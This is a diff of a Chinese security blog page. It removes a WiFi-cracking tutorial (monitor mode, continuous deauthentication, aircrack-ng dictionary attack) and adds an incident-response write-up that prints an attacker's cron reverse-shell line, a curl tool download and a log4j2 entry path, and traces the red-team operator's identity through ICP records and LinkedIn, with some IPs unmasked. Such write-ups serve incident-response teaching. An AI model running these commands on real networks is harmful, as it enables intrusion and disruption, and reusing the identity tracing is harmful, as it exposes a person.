@@ -18,30 +18,38 @@
   <meta name="author" content="k3rwin">
   <meta name="keywords" content="">
   
-    <meta name="description" content="近源渗透一.wifi破解 列出可用无线网卡 airmon-ng   开启网卡监控 airmon-ng check kill airmon-ng start wlan0   扫描wifi  wlan0开启网卡监控后查看重新名称是否修改，ifconfig 可能会变成wlan0mon 关键点：  ·BSSID：网卡MAC地址，  ·CH：信道通道(频道)，  ·ESSID：Wifi名称，  ·STATI">
+    <meta name="description" content="记一次成功的应急并溯源红队身份 背景：某省护网二线打点的时候，被客户协调去远程应急溯源，通过还原攻击链，结合攻击痕迹溯源到红队本人。  1.应急-攻击路径还原1.1 收集攻击痕迹 登录被攻破的服务器，查看linux主机定时任务，发现反弹shell命令,取证并清除 *&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;47.xx.xx.xx&#x2F;xx 0&gt;&amp;1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="近源渗透">
-<meta property="og:url" content="https://k3rwin.github.io/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:title" content="记一次成功的应急并溯源红队身份">
+<meta property="og:url" content="https://k3rwin.github.io/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%BA%94%E6%80%A5%E5%B9%B6%E6%BA%AF%E6%BA%90%E7%BA%A2%E9%98%9F%E8%BA%AB%E4%BB%BD/index.html">
 <meta property="og:site_name" content="K3rwin&#39;s Blog">
-<meta property="og:description" content="近源渗透一.wifi破解 列出可用无线网卡 airmon-ng   开启网卡监控 airmon-ng check kill airmon-ng start wlan0   扫描wifi  wlan0开启网卡监控后查看重新名称是否修改，ifconfig 可能会变成wlan0mon 关键点：  ·BSSID：网卡MAC地址，  ·CH：信道通道(频道)，  ·ESSID：Wifi名称，  ·STATI">
+<meta property="og:description" content="记一次成功的应急并溯源红队身份 背景：某省护网二线打点的时候，被客户协调去远程应急溯源，通过还原攻击链，结合攻击痕迹溯源到红队本人。  1.应急-攻击路径还原1.1 收集攻击痕迹 登录被攻破的服务器，查看linux主机定时任务，发现反弹shell命令,取证并清除 *&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;47.xx.xx.xx&#x2F;xx 0&gt;&amp;1">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021413933.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021301071.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021331489.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021352164.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021404818.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021407583.png">
-<meta property="article:published_time" content="2023-09-02T04:54:38.000Z">
-<meta property="article:modified_time" content="2023-09-02T06:13:52.852Z">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261553925.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261553335.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgimg202310261418393.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261422156.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261427882.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261430775.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261438611.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261441679.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261443128.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261531850.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261452251.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261454559.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261519017.png">
+<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261549252.png">
+<meta property="article:published_time" content="2023-10-26T03:28:03.000Z">
+<meta property="article:modified_time" content="2023-10-26T07:54:04.519Z">
 <meta property="article:author" content="k3rwin">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021413933.png">
+<meta name="twitter:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261553925.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>近源渗透 - K3rwin&#39;s Blog</title>
+  <title>记一次成功的应急并溯源红队身份 - K3rwin&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -240,7 +248,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="近源渗透"></span>
+            <span id="subtitle" data-typed-text="记一次成功的应急并溯源红队身份"></span>
           
         </div>
 
@@ -256,8 +264,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-02 12:54" pubdate>
-          2023年9月2日 下午
+        <time datetime="2023-10-26 11:28" pubdate>
+          2023年10月26日 上午
         </time>
       </span>
     
@@ -268,7 +276,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          571 字
+          1.2k 字
         
       </span>
     
@@ -279,7 +287,7 @@
         
         
         
-          5 分钟
+          10 分钟
         
       </span>
     
@@ -325,58 +333,69 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">近源渗透</h1>
+            <h1 style="display: none">记一次成功的应急并溯源红队身份</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="近源渗透"><a href="#近源渗透" class="headerlink" title="近源渗透"></a>近源渗透</h1><h2 id="一-wifi破解"><a href="#一-wifi破解" class="headerlink" title="一.wifi破解"></a>一.wifi破解</h2><ol>
-<li><p>列出可用无线网卡</p>
-<p><code>airmon-ng</code></p>
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021413933.png" srcset="/img/loading.gif" lazyload alt="image-20230902125854051"></p>
-</li>
-<li><p>开启网卡监控</p>
-<p><code>airmon-ng check kill</code></p>
-<p><code>airmon-ng start wlan0</code></p>
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021301071.png" srcset="/img/loading.gif" lazyload alt="image-20230902130113036"></p>
-</li>
-<li><p>扫描wifi</p>
-<blockquote>
-<p>wlan0开启网卡监控后查看重新名称是否修改，ifconfig</p>
-<p>可能会变成wlan0mon</p>
-<p><strong>关键点：</strong></p>
-<ul>
-<li><p><strong>·BSSID：网卡MAC地址，</strong></p>
-</li>
-<li><p><strong>·CH：信道通道(频道)，</strong></p>
-</li>
-<li><p><strong>·ESSID：Wifi名称，</strong></p>
-</li>
-<li><p><strong>·STATION：可理解为连接着这个网络的某一台手机的MAC地址</strong></p>
-</li>
-</ul>
-<p> <strong>.PWR：信号强弱程度，数值越小信号越强；</strong></p>
-<p> <strong>.DATA：数据量，越大使用的人就越多</strong></p>
+                <h1 id="记一次成功的应急并溯源红队身份"><a href="#记一次成功的应急并溯源红队身份" class="headerlink" title="记一次成功的应急并溯源红队身份"></a>记一次成功的应急并溯源红队身份</h1><blockquote>
+<p>背景：某省护网二线打点的时候，被客户协调去远程应急溯源，通过还原攻击链，结合攻击痕迹溯源到红队本人。</p>
 </blockquote>
-<p><code>airmon-ng start wlan0</code> </p>
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021331489.png" srcset="/img/loading.gif" lazyload alt="image-20230902133126443"></p>
+<h2 id="1-应急-攻击路径还原"><a href="#1-应急-攻击路径还原" class="headerlink" title="1.应急-攻击路径还原"></a>1.应急-攻击路径还原</h2><h3 id="1-1-收集攻击痕迹"><a href="#1-1-收集攻击痕迹" class="headerlink" title="1.1 收集攻击痕迹"></a>1.1 收集攻击痕迹</h3><ol>
+<li><p>登录被攻破的服务器，查看linux主机定时任务，发现反弹shell命令,取证并清除</p>
+<p><code>*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/47.xx.xx.xx/xx 0&gt;&amp;1</code></p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261553925.png" srcset="/img/loading.gif" lazyload alt="image-20231026113321010"></p>
+<p><strong>得到红队vps-1：47.xx.xx.xx</strong></p>
 </li>
-<li><p>抓包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">airodump-ng -w wifi -c 11 --bssid 64:64:4A:B3:B4:56 wlan0 <br><br>   	 -c：指定信道<br>     -w：保存数据包名<br>     --bssid：指定路由器的MAC<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021352164.png" srcset="/img/loading.gif" lazyload alt="image-20230902135235126"></p>
+<li><p>查看history命令，获取攻击手法</p>
+<p>使用fscan扫描大杀器进行内网扫描，下载命令暴露了文件服务器</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261553335.png" srcset="/img/loading.gif" lazyload alt="image-20231026141614095"></p>
+<p><code>curl -o fscan_plus http://110.xx.xx.xx:xx/tools/downloadfile?fileid=1271cf84-dc99-11ec-94b8-5254004d88fb</code></p>
+<p><strong>得到疑似红队下载服务器vps-2：110.xx.xx.xx</strong></p>
+<p>发现内网扫描有ms17-010漏洞，但是登录ms17-010机器排查后暂无告警和对外连接信息，还未被当做跳板。</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/imgimg202310261418393.png" srcset="/img/loading.gif" lazyload alt="image-20231026141830363"></p>
 </li>
-<li><p>wifi攻击，打断重连获取握手包(可选)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aireplay-ng -0 0 -c BC:D0:74:1E:2B:1D -a 64:64:4A:B3:B4:56 wlan0<br><br>-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）<br>-a：指定路由器的MAC<br>-c：指定客户机的MAC<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021404818.png" srcset="/img/loading.gif" lazyload alt="image-20230902140416760"></p>
+<li><p>使用nps进行内网穿透</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261422156.png" srcset="/img/loading.gif" lazyload alt="image-20231026142254111"></p>
+<p>发现nps穿透的ip与下载服务器ip一致，确定为红队<strong>vps-2：110.xx.xx.xx</strong>。</p>
 </li>
-<li><p>暴力破解(撞库)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng  -w  /home/parallels/Desktop/pass wifi-09.cap<br>-w 破解字典<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021407583.png" srcset="/img/loading.gif" lazyload alt="image-20230902140752535"></p>
+<li><p>使用echo命令写webshell，并远程下载执行linux木马</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261427882.png" srcset="/img/loading.gif" lazyload alt="image-20231026142751827"></p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261430775.png" srcset="/img/loading.gif" lazyload alt="image-20231026143053739"></p>
+<p>通过查看webshell和linux木马文件确定写入时间为5-30日，拿出5.29-5.30两天的web日志进行分析。</p>
 </li>
 </ol>
+<h3 id="1-2攻击路径排查"><a href="#1-2攻击路径排查" class="headerlink" title="1.2攻击路径排查"></a>1.2攻击路径排查</h3><ol>
+<li><p>web日志排查</p>
+<p>通过查看两天的日志，日志量实在太大，直接取巧搜索常见命令，<code>whoami</code>，发现有一个链接非常可疑，一眼确定是jndi注入得到的内存马。</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261438611.png" srcset="/img/loading.gif" lazyload alt="image-20231026143837567"></p>
+<p>得到可疑ip：223.104.165.202</p>
+</li>
+<li><p>复现攻击手法</p>
+<p>该ip最早访问时间为29日下午13点，通过观察访问请求，发现主要访问登陆页面，</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261441679.png" srcset="/img/loading.gif" lazyload alt="image-20231026144134645"></p>
+<p>手工进行测试登录页面，重点测试jndi注入，发现登录接口存在log4j2漏洞。</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261443128.png" srcset="/img/loading.gif" lazyload alt="image-20231026144332091"></p>
+</li>
+</ol>
+<h3 id="1-3-还原攻击链"><a href="#1-3-还原攻击链" class="headerlink" title="1.3 还原攻击链"></a>1.3 还原攻击链</h3><ol>
+<li><p>先清理各类木马文件及攻击工具，通过收集到的信息还原攻击链：</p>
+<p><strong>攻击者使用ip（223.xx.xx.202）通过网站登陆页面(<a target="_blank" rel="noopener" href="https://183.xx.xx.xx/)%E7%9A%84log4j2">https://183.xx.xx.xx/)的log4j2</a> RCE漏洞获取执行命令权限，使用定时任务反弹shell（反弹vps-1：47.103.222.185）控制服务器，并使用fscan进行内网扫描以及nps（vps-2服务器110.42.64.137）进行横行渗透，并写入webshell和linux后门（控制vps-2：110.42.64.137）</strong></p>
+</li>
+</ol>
+<h2 id="2-溯源"><a href="#2-溯源" class="headerlink" title="2.溯源"></a>2.溯源</h2><ol>
+<li><p>vps溯源</p>
+<p>通过对远控ip（47.xx.xx.xx）进行溯源，对应域名为xxxx.com</p>
+<p>查看icp备案信息，站点归属个人 ：李xx</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261531850.png" srcset="/img/loading.gif" lazyload alt="image-20231026153128792"></p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261452251.png" srcset="/img/loading.gif" lazyload alt="image-20231026145242205"></p>
+<p>互联网查找此人相关信息，找到领英个人主页，目前工作在xx单位的信息安全工程师，主页地址如下:</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261454559.png" srcset="/img/loading.gif" lazyload alt="image-20231026145439528"></p>
+<p>这不是妥妥的黑客嘛？当场逮到，社工库都不用查了。。。</p>
+<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261519017.png" srcset="/img/loading.gif" lazyload alt="006APoFYly1g9yc474qgsj30hs0ehjsd"></p>
+</li>
+</ol>
+<h2 id="3-整理报告，收工"><a href="#3-整理报告，收工" class="headerlink" title="3.整理报告，收工"></a>3.整理报告，收工</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261549252.png" srcset="/img/loading.gif" lazyload alt="攻击溯源反制"></p>
 
                 
               </div>
@@ -415,8 +434,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>近源渗透</div>
-      <div>https://k3rwin.github.io/2023/09/02/近源渗透/</div>
+      <div>记一次成功的应急并溯源红队身份</div>
+      <div>https://k3rwin.github.io/2023/10/26/记一次成功的应急并溯源红队身份/</div>
     </div>
     <div class="license-meta">
       
@@ -428,13 +447,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月2日</div>
+          <div>2023年10月26日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年9月2日</div>
+          <div>2023年10月26日</div>
         </div>
       
       <div class="license-meta-item">
@@ -463,9 +482,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/09/06/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%90%88%E9%9B%86/" title="内网横向移动合集">
+                      <a href="/2023/11/13/awd-note/" title="awd_note">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">内网横向移动合集</span>
+                        <span class="hidden-mobile">awd_note</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -473,8 +492,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/12/python%E5%AE%9E%E7%8E%B0sql%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5/" title="python实现sql中转注入">
-                        <span class="hidden-mobile">python实现sql中转注入</span>
+                      <a href="/2023/10/08/ctf/" title="ctf">
+                        <span class="hidden-mobile">ctf</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -492,8 +511,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://k3rwin.github.io/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/';
-          this.page.identifier = '/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/';
+          this.page.url = 'https://k3rwin.github.io/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%BA%94%E6%80%A5%E5%B9%B6%E6%BA%AF%E6%BA%90%E7%BA%A2%E9%98%9F%E8%BA%AB%E4%BB%BD/';
+          this.page.identifier = '/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%BA%94%E6%80%A5%E5%B9%B6%E6%BA%AF%E6%BA%90%E7%BA%A2%E9%98%9F%E8%BA%AB%E4%BB%BD/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
